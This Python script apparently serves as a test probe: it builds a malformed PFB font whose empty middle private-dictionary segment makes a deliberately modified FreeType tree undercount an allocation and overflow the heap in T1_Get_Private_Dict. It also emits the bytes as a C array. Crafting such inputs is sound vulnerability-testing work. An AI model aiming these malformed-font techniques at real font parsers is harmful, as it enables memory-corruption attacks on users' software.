#!/usr/bin/env python3
# Generates a minimal PFB (Printer Font Binary, Type 1) file that reaches
# T1_Get_Private_Dict() through the public FreeType API (FT_New_Memory_Face).
#
# The private dictionary is encoded as three binary (0x8002) segments:
#   [ seg A: non-empty ] [ seg B: empty, length 0 ] [ seg C: non-empty ]
#
# On the modified tree the size-computation pass stops at the empty segment
# (undercounting the allocation) while the read pass keeps going and copies
# segment C past the end of the allocation -> heap buffer overflow.
import struct, sys

def seg(tag, data=b""):
    # PFB block: 0x80, type, 4-byte little-endian length, payload
    # read_pfb_tag() reads the tag big-endian (0x80NN) then the length LE.
    out = bytes([0x80, tag & 0xFF])
    if tag in (0x01, 0x02):
        out += struct.pack("<I", len(data)) + data
    return out

# Base (clear-text) dictionary.  Must start with "%!PS-AdobeFont" and contain
# an `eexec` token so that parse_dict() stops cleanly and control reaches
# T1_Get_Private_Dict().
base = b"%!PS-AdobeFont-1.0: Probe 001.001\n/FontType 1 def\neexec\n"

A = b"\xAA" * 0x40    # first private-dict segment (counted + written)
C = b"\xCC" * 0x200   # trailing segment, written but NOT counted -> overflow

pfb  = seg(0x01, base)   # 0x8001 base dictionary (text)
pfb += seg(0x02, A)      # 0x8002 private-dict segment A
pfb += seg(0x02, b"")    # 0x8002 empty segment (length 0) -> terminates sizing
pfb += seg(0x02, C)      # 0x8002 private-dict segment C
pfb += seg(0x03)         # 0x8003 EOF

with open(sys.argv[1] if len(sys.argv) > 1 else "probe.pfb", "wb") as f:
    f.write(pfb)

# Also emit a C array for the self-contained probe.
if len(sys.argv) > 2:
    with open(sys.argv[2], "w") as f:
        f.write("/* Generated by make_pfb.py -- do not edit. */\n")
        f.write("static const unsigned char probe_pfb[] = {\n")
        for i in range(0, len(pfb), 12):
            f.write("  " + ",".join("0x%02x" % b for b in pfb[i:i+12]) + ",\n")
        f.write("};\n")
        f.write("static const unsigned int probe_pfb_len = %d;\n" % len(pfb))
print("wrote %d bytes" % len(pfb))
